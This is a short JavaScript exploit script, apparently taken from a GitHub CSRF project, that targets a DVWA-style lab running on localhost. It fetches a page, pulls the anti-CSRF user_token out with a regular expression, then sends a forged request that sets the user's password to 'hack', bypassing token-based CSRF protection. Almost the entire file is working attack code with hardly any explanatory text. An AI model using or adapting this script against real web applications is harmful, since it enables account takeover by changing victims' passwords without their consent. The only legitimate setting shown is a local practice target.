// FOR TOKENS
// REFERENCE: https://github.com/Melk0rr/csrfJS
    // author : from GitHub Me1k0r
/**
 * Ready state instructions
 * @param {XMLHttpRequest} req : XMLHttpRequest instance
 * @param {Function} callback : callback function to execute once the request is successful
 * @return {void}
 */
const handleReadyState = (req, callback) => {
    try {
        if (req.readyState === XMLHttpRequest.DONE) {
            const {responseText: response} = req;
            if (req.status === 200) callback(req, response); // If successful, executes callback function
            else console.error("Request failed!");
        }
    } catch (error) {
        throw `Caught error: ${error}`;
    }
}

/**
 * Creates a new HTTP GET request
 * @param {String} url : url where the request will be sent
 * @param {Function} callback : callback function to execute once the request is successful
 * @return {boolean} : whether or not the request has been sent
 */
const myGetRequest = (url, callback) => {
    const httpRequest = new XMLHttpRequest(); // New http request instance

    // Handles instance problem
    if (!httpRequest) {
        console.error("The XMLHttpRequest could not be instanciated!");
        return false;
    }

    httpRequest.onreadystatechange = () => handleReadyState(httpRequest, callback); // Prepare ready state

    // Send the request
    httpRequest.open('GET', url);
    httpRequest.send();
    return true;
}

let success = false;

myGetRequest('http://127.0.0.1:51291/csrf.html', (req, response) => {
    const tokenRegex = /user_token\' value\=\'(.*?)\' \/\>/;
    const match = response.match(tokenRegex); // Check if anything matches the regex
    const {1: token} = match; // Gets the token
    const passwd = 'hack';
    const hackUrl = `http://127.0.0.1:51291/csrf/?user_token=${token}&password_new=${passwd}&password_conf=${passwd}&Change=Change`;

    if (!success) {
        success = true;

        // Send the request
        req.open('GET', hackUrl);
        req.send();
    }
});